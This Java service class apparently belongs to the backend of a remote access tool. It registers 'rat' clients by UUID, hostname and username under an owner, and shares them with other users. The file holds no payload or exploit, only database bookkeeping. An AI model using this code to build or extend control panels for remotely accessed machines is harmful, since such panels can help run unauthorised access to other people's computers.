package ovh.wpkg.lskg.services.rat;

import jakarta.inject.Inject;
import jakarta.inject.Singleton;
import jakarta.transaction.Transactional;
import ovh.wpkg.lskg.db.entities.RatInfo;
import ovh.wpkg.lskg.db.entities.User;
import ovh.wpkg.lskg.db.repository.RatInfoRepository;

import java.util.UUID;

@Singleton
public class RatInfoService {

    @Inject
    RatInfoRepository ratInfoRepository;

    @Transactional
    public void registerRat(User owner, UUID uuid, String hostname, String username) {
        var ratInfo = ratInfoRepository.findByUuid(uuid);

        if (ratInfo.isEmpty()) {
            ratInfoRepository.save(new RatInfo(null, uuid, hostname, username, true, owner, null, null));
        }
    }

    @Transactional
    public void shareRat(UUID uuid, User user) {
        var ratInfo = ratInfoRepository.findByUuid(uuid);
        if (!ratInfo.orElseThrow().getSharedToUsers().contains(user)) {
            ratInfo.orElseThrow().getSharedToUsers().add(user);
        }

        ratInfoRepository.update(ratInfo.orElseThrow());
    }
}
